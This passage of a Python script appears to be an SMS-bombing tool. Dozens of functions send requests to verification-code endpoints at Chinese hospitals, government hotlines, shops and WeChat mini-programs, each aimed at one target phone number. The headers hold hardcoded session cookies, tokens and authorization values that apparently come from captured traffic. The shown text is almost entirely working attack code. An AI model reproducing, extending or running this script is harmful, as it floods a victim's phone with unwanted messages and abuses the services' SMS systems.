    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079",
    "Content-Type": "application/json",
    "Accept": "*/*",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://servicewechat.com/wx942a1bf556cf82ed/1/page-frame.html",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9",
}

    data47 = {
    "phone": phone,
    "type": 1,
    "lat": 12435,
    "lng": 8946,
    "storeId": 0,
    "appId": "wx942a1bf556jsnsb",
    "scene": 1053,
}

    response47 = requests.post(url47, headers=headers47, json=data47)
    print("第46个接口运行完毕")

def request_url48():
    url48 = "https://api.jmfww.com/api/Common/GetMobileCode"
    headers48 = {
    "Host": "api.jmfww.com",
    "Connection": "keep-alive",
    "Content-Length": "25",
    "xweb_xhr": "1",
    "Authorization": "Bearer",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079",
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept": "*/*",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://servicewechat.com/wxe1329bb7bf594139/9/page-frame.html",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9",
}


    data48 = {"mobile": phone, "type": 2}

    response48 = requests.post(url48, headers=headers48, data=data48)
    print("第47个接口运行完毕")

def request_url49():
    url49 = "https://ehospital-members.sq580.com/v1_0/ehospital/app/common/sendVerifyCode"
    headers49 = {
    "Host": "ehospital-members.sq580.com",
    "Connection": "keep-alive",
    "Content-Length": "23",
    "xweb_xhr": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079",
    "token": "",
    "Content-Type": "application/json",
    "Accept": "*/*",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://servicewechat.com/wxaf36c6d75fa74101/70/page-frame.html",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9",
}

    data49 = {"phone": phone}

    response49 = requests.post(url49, headers=headers49, json=data49)
    print("第48个接口运行完毕")
    
def request_url50():
    url50 = "https://hospital.fjlyrmyy.com/ihp-gateway/api/cms/sendCode"
    headers50 = {
    "Host": "hospital.fjlyrmyy.com",
    "Connection": "keep-alive",
    "Content-Length": "450",
    "Accept": "application/json, text/plain, */*",
    "xweb_xhr": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079",
    "Content-Type": "application/json",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://servicewechat.com/wxc8153d762f458c41/6/page-frame.html",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9",
}

    data50 = {
    "transType": "",
    "param": {
        "phone": phone,
        "codeType": "LOGIN",
        "miniOpenId": "o41bz5Tif8yAhus3xP5M4ypm3N0c",
    },
    "pageParam": {},
    "serviceId": "",
    "appId": "8a8a87106b72a440016b72bf44a10000",
    "deviceId": "04daccefc14033ed3d18f157a9f6d1d8",
    "signType": "MD5",
    "termType": "WX_MINI",
    "version": "1.0.0",
    "appVersion": "1.0.0",
    "termId": "1234",
    "alg": "AES",
    "sign": "rasfs2334214fasf",
    "timestamp": "1711476594145",
    "platId": "T2023041400000000001",
    "isEncrypt": 0,
    "sessionId": "",
}

    response50 = requests.post(url50, headers=headers50, json=data50)
    print("第49个接口运行完毕")

def request_url51():
    url51 = "https://homedoctor.grdoc.org/api/common/captcha/send"
    headers51 = {
    "Host": "homedoctor.grdoc.org",
    "Connection": "keep-alive",
    "Content-Length": "126",
    "xweb_xhr": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079",
    "client": "windows-applet-1.0.0",
    "token": "69052a2a113affd66a7fb294ec6cb2221ac8ba430ebf1ea1572317fc898772d4",
    "Content-Type": "application/json",
    "Accept": "*/*",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://servicewechat.com/wx931cd4767b40b972/5/page-frame.html",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9",
}

    data51 = {
    "token": "69052a2a113affd66a7fb294ec6cb2221ac8ba430ebf1ea1572317fc898772d4",
    "role": "user",
    "scene": 1,
    "telephone": phone,
}

    response51 = requests.post(url51, headers=headers51, json=data51)
    print("第50个接口运行完毕")

def request_url52():
    url52 = f"https://ai.gzquankeinfo.com:8061/api/sms/sms/valcode?phone={phone}&orgCode=10000001"
    response52 = requests.get(url52)
    print("第51个接口运行完毕")


def request_url53():
    url53 = f"https://hxxs.mrrac.com/sendCode?mobile={phone}"
    response53 = requests.get(url53)
    
def request_url54():
    url54 = f"https://ggfw.rlsbj.cq.gov.cn/xcb/zgbtxt/zpw_hd/code?tel={phone}&uuid="
    response54 = requests.get(url54)
    
def request_url55():
    url55 = f"https://remote-meter.cn:8098/mt-flowJingM/applet/user/profiles/getCode?phone={phone}"
    response55 = requests.get(url55)
    
def request_url56():
    url56 = f"https://cxdc.mybti.cn:3700/ps/api/SendVerifyCode?phoneNumber={phone}"
    response56 = requests.get(url56)
    
def request_url57():
    url57 = f"https://szjy.yyjqrj.net:9011/api/sms/sms/valcode?phone={phone}&orgCode="
    response57 = requests.get(url57)
    
def request_url58():
    url58 = f"https://isus.vip/cgi.sms.send?mobile={phone}"
    response58 = requests.get(url58)
    
def request_url59():
    url59 = f"https://wsylfw.org315.cn/htohcloud-admin/service/getSmsCode?phoneNum={phone}"
    response59 = requests.get(url59)
    
def request_url60():
    url60 = f"https://zhaopin.baihepan.com/prod-api/captchaSms?timestamp=1711529949073&phonenumber={phone}"
    response60 = requests.get(url60)
    
def request_url61():
    url61 = f"https://www.iotlot.cn/api/main/verifyCode?phone={phone}"
    response61 = requests.get(url61)
    
def request_url62():
    url62 = f"https://wechatapp.baofengenergy.com:5022/pms/appLogin/code?phone={phone}&isRegister=true"
    response62 = requests.get(url62)
    
def request_url63():
    url63 = "https://maicai.api.ddxq.mobi/user/getSms"
    headers63 = {
    "Host": "maicai.api.ddxq.mobi",
    "Connection": "keep-alive",
    "ddmc-city-number": "0101",
    "ddmc-ip": "",
    "ddmc-build-version": "4.17.3",
    "ddmc-os-version": "Windows 10 x64",
    "ddmc-channel": "applet",
    "ddmc-latitude": "0",
    "Cookie": "DDXQSESSID=573g65h87y59y65v9v4y165dv3657y23xzdvq36g7hvy56lfxi4l83wyi5egj00g",
    "ddmc-oc_t": "1714851956",
    "ddmc-api-version": "11.17.0",
    "ddmc-longitude": "0",
    "ddmc-SDKVersion": "3.4.3",
    "ddmc-time": "1714852018",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(6.0700.143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat/(6309062b) XWEB/9129",
    "Content-Type": "application/x-www-form-urlencoded",
    "ddmc-device-id": "osP8I0awRCC_O1WiPSvhuWwJTAD4",
    "ddmc-uid": "",
    "xweb_xhr": "1",
    "ddmc-app-client-id": "4",
    "ddmc-station-id": "5500fe01916edfe0738b4e43",
    "ddmc-oc": "99.99999999999999,888.88888888888888",
    "Accept": "*/*",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://servicewechat.com/wx1e113254eda17715/609/page-frame.html"
}
    data63 = {
    "uid": "",
    "longitude": 0,
    "latitude": 0,
    "station_id": "5500fe01916edfe0738b4e43",
    "city_number": "0101",
    "api_version": "11.17.0",
    "app_version": "4.17.3",
    "channel": "applet",
    "app_client_id": 4,
    "s_id": "573g65h87y59y65v9v4y165dv3657y23xzdvq36g7hvy56lfxi4l83wyi5egj00g",
    "openid": "osP8I0awRCC_O1WiPSvhuWwJTAD4",
    "device_id": "osP8I0awRCC_O1WiPSvhuWwJTAD4",
    "h5_source": "",
    "time": 1714852018,
    "device_token": "WHJMrwNw1k%2FG0%2Fi%2BZiR4QiSBilQrUFhr7NLVbXikVsBN4l%2BOKowg9f8FaBMv%2BtaRplcweYZ6SDl1r7HAdJk%2F7PjsEueh9QrdCW1tldyDzmauSxIJm5Txg%3D%3D1487582755342",
    "mobile": phone,
    "verify_code": "",
    "type": 3,
    "area_code": 86,
    "showData": True,
    "app_client_name": "wechat",
    "nars": "6cbb1f42a9ee475803d1d4e4c1eed7a9",
    "sesi": "%7B%22sesiT%22%3A%22FgyjShta664c3c02804207401279c151d7e6f1ac%22%2C%22sdkv%22%3A%222.0.0%22%7D"
}
    response63 = requests.post(url63, headers=headers63, data=data63)
def request_url64():
    url64 = f"https://gateway.zhiniu.com/zucenter-server/user/getSmsCode?telephone={phone}&type=1"
    response64 = requests.get(url64)
    
def request_url65():
    url65 = f"https://s.i.bucg.com/es/sendSms?phone={phone}"
    response65 = requests.get(url65)
    
def request_url66():
    url66 = f"https://clgl.cadc.net.cn/api/Base/GetSmsCheckcode?telno={phone}&checkdup=1&areaid=&rolecode=TJKS"
    response66 = requests.get(url66)
    
def request_url67():
    url67 = f"https://www.pinganbinzhong.com/mpmt-user/login/validateCode?mobile={phone}&code=&checkNotFlag=1"
    response67 = requests.get(url67)
    
def request_url68():
    url68 = f"https://zwj.ztttb.com/webApp/yn/randNumNoLogin?userMobile={phone}&validateCodeType=01"
    response68 = requests.get(url68)
    
def request_url69():
    url69 = f"https://cd12345.pointlinkprox.com:9443/scmd/chain/sendSMSCode?custPhone={phone}&tenantId=83ad2a2955f34ec5b9d30eb590e284d6"
    response69 = requests.get(url69)
    
def request_url70():
    url70 = f"https://www.htjdxf.com/prod-api/applet/captcha/send/2/{phone}"
    response70 = requests.get(url70)
    
def request_url71():
    url71 = f"https://dhswyt.qz-soft.com//tools/wechatmember.ashx?action=SendPhoneCode&phone={phone}"
    response71 = requests.get(url71)
    
def request_url72():
    url72 = f"https://yjzl.xzweijiancha.cn/client/front/wxUser/token/{phone}"
    response72 = requests.get(url72)
    
def request_url73():
    url73 = f"https://bsx.baoding12345.cn/web/bduser/register?mobile={phone}"
    response73 = requests.get(url73)
    
def request_url74():
    url74 = f"https://yf12345.yunfu.gov.cn/workorderApp/wx/auth/sendVerificationCode.json?mobile={phone}&operateType=18"
    response74 = requests.get(url74)
    
def request_url75():
    url75 = f"https://cgj.lasa.gov.cn/eGovaPublic/mi/app/sendidentifycode?phoneNum={phone}&corName=egova&isJsonp=1&cityCode=100&terminalID=7&access_token=&token="
    response75 = requests.get(url75)
    
def request_url76():
    url76 = f"http://user.daojia.com/mobile/getcode?mobile={phone}"
    response76 = requests.get(url76)
    
def request_url77():
    url77 = f"https://login1.q1.com/Validate/SendMobileLoginCode?jsoncallback=jQuery1111039587384237433687_1627172292811&Phone={phone}&Captcha=&_=1627172292814"
    response77 = requests.get(url77)
    
def request_url78():
    url78 = f"http://www.tanwan.com/api/reg_json_2019.php?act=3&phone={phone}&callback=jQuery112003247368730630804_1643269992344&_=1643269992347"
    response78 = requests.get(url78)
    
def request_url79():
    url79 = f"https://m.wanzhoumo.com/proxy?api_path=%2Fuser%2Fmobilelogincode&v=3.0&fields_version=3.3&mobile={phone}"
    response79 = requests.get(url79)
    
def request_url80():
    url80 = f"https://jdapi.jd100.com/uc/v1/getSMSCode?account={phone}&sign_type=1&use_type=1"
    response80 = requests.get(url80)
    
def request_url81():
    url81 = f"https://xwwl-api.easthope.cn/ums/captcha/driverLoginSms?captchaToken=123&mobile={phone}&imageText=mas6"
    response81 = requests.get(url81)
    
def request_url82():
    url82 = f"https://wx.rsj.baoji.gov.cn/bjwxVeifyPhone.action?phone={phone}"
    response82 = requests.get(url82)
    
def request_url83():
    url83 = f"https://api.jiuyeyuren.com/api/user/sendcode?phone={phone}&public_source=3&apptype=ysyc"
    response83 = requests.get(url83)
    
def request_url84():
    url84 = f"https://shark.x.ufans.cn/bapi/sms?mobile={phone}"
    response84 = requests.get(url84)
    
def request_url85():
    url85 = f"https://zwj.ztttb.com/webApp/yn/randNumNoLogin?userMobile={phone}&validateCodeType=01"
    response85 = requests.get(url85)
    
def request_url86():
    url86 = f"https://yf12345.yunfu.gov.cn/workorderApp/wx/auth/sendVerificationCode.json?mobile={phone}&operateType=18"
    response86 = requests.get(url86)
    
def request_url87():
    url87 = f"https://great.minxundianzi.com/greatweb/great/user/sendSmsCode?countryCode=86&userTel={phone}&type=1"
    response87 = requests.get(url87)
    
def request_url88():
    url88 = f"https://gemini.minxundianzi.com/marsplan/mars/user/sendSmsCode?countryCode=86&userTel={phone}&type=1"
    response88 = requests.get(url88)
    
def request_url89():
    url89 = f"https://bfat.minxundianzi.com/yunjibodyfat/web/sendSmsCode?countryCode=86&userTel={phone}"
    response89 = requests.get(url89)
    
def request_url90():
    url90 = f"https://curiousmore.com/qmore/user/sms/send?is_teach_paypal=true&mobile={phone}"
    response90 = requests.get(url90)
    
def request_url91():
    url91 = f"https://www.ruijie.com.cn/application/api/m/sms/send?phone={phone}"
    response91 = requests.get(url91)
    
def request_url92():
    url92 = f"https://nf.video/8081/api/auth/get/phone/code?phone={phone}&cid=86"
    response92 = requests.get(url92)
    
def request_url93():
    url93 = f"https://applet.mbadashi.com/appletapi/applet/authorizations/smscode?mobile={phone}"
    response93 = requests.get(url93)
    
def request_url94():
    url94 = f"https://next.gacmotor.com/mall/center-current-app/login/sendMsg/{phone}"
    response94 = requests.get(url94)
    
def request_url95():
    url95 = "https://zybackendf-prod.myquanyi.com/sendverifycode/sendverifycode?_platform_num=153635&mobile={phone}&bus_id=101&tem_id=1001"
    response95 = requests.get(url95)
    
def request_url96():
    url96 = f"https://great.minxundianzi.com/greatweb/great/user/sendSmsCode?countryCode=86&userTel={phone}&type=1"
    response96 = requests.get(url96)
    
def request_url97():
    url97 = f"https://aiyidaijia.kuaimazhixing.com/frontapi/oeapi/prelogin?sig=81777b886918c47d1316d2a5215c2d&appkey=61000211&from=02050060&udid=oLX9N5V-3Ml1EZVcqFr0fg1wERSE&from_type=mini&app_ver=9.6.0&ver=3.4.3&os=windows&source=5&wxAppId=wxb46d03964eecda54&current_city_id=410500&phone={phone}&business=edaijia_"
    response97 = requests.get(url97)
    
def request_url98():
    url98 = f"https://fyxrd.168fb.cn/master_renda/public/api/Login/sendsms?phone={phone}&user_type=2"
    response98 = requests.get(url98)
    
def request_url99():
    url99 = f"http://user.sanwan.club/push/verificationCode/send?phone={phone}&useSms=true"
    response99 = requests.get(url99)
    
def request_url101():
    url101 = f"https://dss.xiongmaopeilian.com/student_wx/student/send_sms_code?country_code=86&mobile={phone}"
    response101 = requests.get(url101)
    
def request_url102():
    url102 = f"https://12345.scncggzy.com.cn/wx/auth/sendVerificationCode.json?mobile={phone}"
    response102 = requests.get(url102)
    
def request_url103():
    url103 = f"https://apis.niuxuezhang.cn/v1/sms-code?phone={phone}"
    response103 = requests.get(url103)
    
def request_url104():
    url104 = f"https://uc.17win.com/sms/v4/web/verificationCode/send?mobile={phone}&scene=bind&isVoice=N&appId=08100110010000"
    response104 = requests.get(url104)
    
def request_url105():
    url105 = f"https://wccy-server.sxlyb.com/open/v1/login-code/{phone}?phone={phone}"
    response105 = requests.get(url105)
    
def request_url106():
    url106 = f"https://m.ehaier.com/v3/platform/sms/getSmsCode.json?mobile={phone}&type=login"
    response106 = requests.get(url106)
    
def request_url107():
    url107 = f"https://wechat.hfmlgy.com/wechat/set/{phone}/QFKJ10001"
    response107 = requests.get(url107)
    
def request_url108():
    url108 = f"https://mapi.ekwing.com/parent/user/sendcode?scenes=login&tel={phone}&v=9.0&os=Windows"
    response108 = requests.get(url108)
    
def request_url109():
    url109 = f"https://qxt.matefix.cn/api/wx/common/sendMsgCode?mobile={phone}"
    response109 = requests.get(url109)
    
def request_url110():
    url110 = f"https://test.ccsc58.com/send_code?phone={phone}&action=regist"
    response110 = requests.get(url110)
    
def request_url111():
    url111 = f"https://api.lanniao.com/workerApi/index/sendIdentifySms/{phone}"
    response111 = requests.get(url111)
    
def request_url112():
    url112 = f"https://bb.hzbeiyang.com/platform/sms/register/V2?mobile={phone}&xcxAppId=wxa663a58156eb05b2"
    response112 = requests.get(url112)
    
def request_url113():
    url113 = f"https://m-api.rocketbird.cn/mobile/Index/sendSmsCode?v=1.3.2&phone={phone}&m_openid=o1wsW0eE8ynJnniLNeVartjr3c-s"
    response113 = requests.get(url113)

def request_url114():

    url114 = "https://api.paozhengtong.com/notarize/user/sendMessage"
    headers114 = {
    "Host": "api.paozhengtong.com",
    "Connection": "keep-alive",
    "Content-Length": "17",
    "scene": "pzt_weixin_0.0.116",
    "xweb_xhr": "1",
    "checkSumDTO": '{"appid":"20200924001","nonce":"554360341071","curtime":"1712223908000","checksum":"a9ed7bdc8734b150333b59ca005d62082074365f"}',
    "appid": "wx4d68f497875d7e2c",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079",
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept": "*/*",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://servicewechat.com/wx4d68f497875d7e2c/33/page-frame.html",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9",
}
    data114 = {"phone": phone}

    response114 = requests.post(url114, headers=headers114, data=data114)
   
def request_url115():

    url115 = "https://api.9tax.com/newspaper/user/sendMessage"
    headers115 = {
    "Host": "api.9tax.com",
    "Connection": "keep-alive",
    "Content-Length": "17",
    "scene": "pzt_weixin_0.0.116",
    "system": '{"model":"microsoft","appName":"wxe1f61a425eaae0b8","system":"Windows 10 x64"}',
    "xweb_xhr": "1",
    "appid": "wx86f84c798cfb9a6b",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079",
    "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
    "Accept": "*/*",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://servicewechat.com/wx86f84c798cfb9a6b/21/page-frame.html",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9",
}
    data115 = {"phone": phone}

    response115 = requests.post(url115, headers=headers115, data=data115)    
    
def request_url116():

    url116 = "https://m.midea.cn/next/user_assist/getmobilevc"
    headers116 = {
    "Host": "m.midea.cn",
    "Connection": "keep-alive",
    "Content-Length": "38",
    "X-Wx-Version": "3.9.6/3.4.1",
    "xweb_xhr": "1",
    "X-Wx-Appid": "wxa13e96304985b75d",
    "Cookie": "midea_mk=486649a8b67c920c3134dd81ed1e3aa;plt=wxsapp;appname=weapp_fx_r",
    "X-Wx-Ref": "pages/login/login",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9105",
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept": "*/*",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://servicewechat.com/wxa13e96304985b75d/158/page-frame.html",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9",
}
    data116 = {"scene": "terminal_shop", "mobile": phone}

    response116 = requests.post(url116, headers=headers116, data=data116)
    
def request_url117():
    url117 = "https://api.shengtuanyouxuan.com/mini/life/v1/captcha/getCaptcha"
    headers117 = {
    "Host": "api.shengtuanyouxuan.com",
    "Connection": "keep-alive",
    "Content-Length": "49",
    "mini-type": "miniLife",
    "xweb_xhr": "1",
    "mini-version": "2.4.5",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309092b)XWEB/8461",
    "sign": "QKwUegAfSGGrcQyas7TsB4uCP78=",
    "Content-Type": "application/json",
    "Accept": "*/*",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://servicewechat.com/wx97e0a0a3ea2f4155/11/page-frame.html",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9"
}
    data117 = {
    "phone": phone,
    "bizCode": "miniBindPhone"
}

    response117 = requests.post(url117, headers=headers117, json=data117)    
     
def request_url118():
    url118 = "https://web.tlawyer.cn/account/sendsmsregister"
    headers118 = {
    "Host": "web.tlawyer.cn",
    "Connection": "keep-alive",
    "Content-Length": "17",
    "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "X-Requested-With": "XMLHttpRequest",
    "sec-ch-ua-mobile": "?0",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309092b)XWEB/8461",
    "sec-ch-ua-platform": '"Windows"',
    "Origin": "https://web.tlawyer.cn",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://web.tlawyer.cn/account/reg?ref=/app/ask/lhxy",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9",
    "Cookie": "_app=lhxy; _user_sid=bqe43fdvv5lievv4ravjd5v0"
}
    data118 = {
    "phone": phone
}

    response118 = requests.post(url118, headers=headers118, data=data118)
def request_url121():
    url121 = "https://wap-api.duoyou.com/index.php/member/send_verification?game_id=100206&media_id=dy_59639386&is_red_sdk=1&idfa=89238414-3824-4F4D-BC95-8DABAB134023"
    headers121 = {
    "Host": "wap-api.duoyou.com",
    "Accept": "application/json, text/plain, */*",
    "Sec-Fetch-Site": "same-site",
    "Accept-Language": "zh-CN,zh-Hans;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Sec-Fetch-Mode": "cors",
    "Content-Type": "application/json;charset=utf-8",
    "Origin": "https://wap.duoyou.com",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Referer": "https://wap.duoyou.com/",
    "Connection": "keep-alive",
    "Sec-Fetch-Dest": "empty"
}

    data121 = {
    "scene": "smsLogin",
    "mobile": phone
}

    response121 = requests.post(url121, headers=headers121, json=data121)
     
def request_url122():
    url122 = "https://passport.xag.cn/home/sms_code"
    headers122 = {
    "Host": "passport.xag.cn",
    "Connection": "keep-alive",
    "Content-Length": "24",
    "mini": "member",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079",
    "Authorization": "Basic QTFDQ0FFOUItNjcwMi0wOUY4LTVDNjUtOTM3M0ZEQkY4OTY4OjNhYzcxNjk2OGM0NzlmMmMzZTVhYjc1MjQ2OTYyMWJi",
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept": "application/json",
    "xweb_xhr": "1",
    "X-Requested-With": "XMLHttpRequest",
    "token": "",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://servicewechat.com/wx43471742f3e783cb/213/page-frame.html",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9"
}

    data122 = {
        "icc": "86",
        "phone": phone
}
    response122 = requests.post(url122, headers=headers122, data=data122)

def request_url123():
    url123 = "https://m-sqhlwyy.panyu.gd.cn/med/gateway/640009/ytGateway"
    headers123 = {
    "Host": "m-sqhlwyy.panyu.gd.cn",
    "Connection": "keep-alive",
    "Content-Length": "54",
    "SRType": "wechat",
    "yt-h5url": "/packages/login_with_phone/index",
    "SRKey": "panyu",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079",
    "X-WX-Model": "microsoft",
    "Content-Type": "application/x-www-form-urlencoded",
    "xweb_xhr": "1",
    "X-Requested-With": "XMLHttpRequest",
    "Cookie": "connect.sid=s:jvqIK7Zaee0wu5JbSuZZ8sDhjMo3IR0f.b0SnJDCKgOHw2fmQVXxjPzQpLNRk%2B8HWTj3o2LX1BU0",
    "version": "89.1.0",
    "Accept": "*/*",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://servicewechat.com/wx6b114e41079b7388/3/page-frame.html",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9"
}

    data123 = {
    "api_name": "/r/10001/103@udb3",
    "phoneNo": phone
}
    response123 = requests.post(url123, headers=headers123, data=data123)
  
def request_url124():
    url124 = "https://fcm2-5.ocj.com.cn/api/newMedia/login/mini/login/securityCode"
    headers124 = {
    "Host": "fcm2-5.ocj.com.cn",
    "Connection": "keep-alive",
    "Content-Length": "58",
    "X-media": "03",
    "X-media-channel": "6",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9105",
    "X-chl-code": "3",
    "Content-Type": "application/json",
    "X-msale-platform": "SP",
    "X-msale-code": "MM",
    "X-msale-way": "AMM",
    "xweb_xhr": "1",
    "X-source": "SPG",
    "X-chain-id": "",
    "Accept": "*/*",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://servicewechat.com/wx7e98237a4154ffc7/110/page-frame.html",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9"
}

    data124 = {
    "phone": phone,
    "purpose": "quick_register_context"
}
    response124 = requests.post(url124, headers=headers124, data=data124)
    
def request_url125():
    url125 = "https://api.cdfsunrise.com/restapi/user/sendMobileCode"
    headers125 = {
    "Host": "api.cdfsunrise.com",
    "Connection": "keep-alive",
    "Content-Length": "214",
    "AppVersion": "1.29.6",
    "MiniApp": "weapp",
    "mobile": "",
    "showLoading": "[object Boolean]",
    "UserSystem": "WeChat",
    "OsVersion": "10",
    "device": "",
    "openid": "",
    "ClientNetwork": "wifi",
    "headers": "[object Object]",
    "OS": "unknown",
    "UnionId": "",
    "DeviceId": "DCB544E2087CEE28-A0B923820DCC509A-253638247",
